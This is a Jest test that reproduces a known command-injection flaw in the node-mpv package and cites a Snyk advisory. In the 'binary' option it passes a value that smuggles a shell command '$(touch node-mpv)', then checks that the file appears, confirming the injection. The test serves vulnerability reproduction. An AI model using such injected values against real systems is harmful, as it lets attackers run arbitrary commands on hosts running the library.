//https://snyk.io/vuln/SNYK-JS-NODEMPV-564426
test("Command Injection in node-mpv", () => {
  const Root = require("node-mpv");
  const fs = require("fs");
  const path = "./node-mpv";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  var options = {
    binary: '" $(touch node-mpv) "',
  };
  try {
    var root = new Root(options);
  } catch (error) {}

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
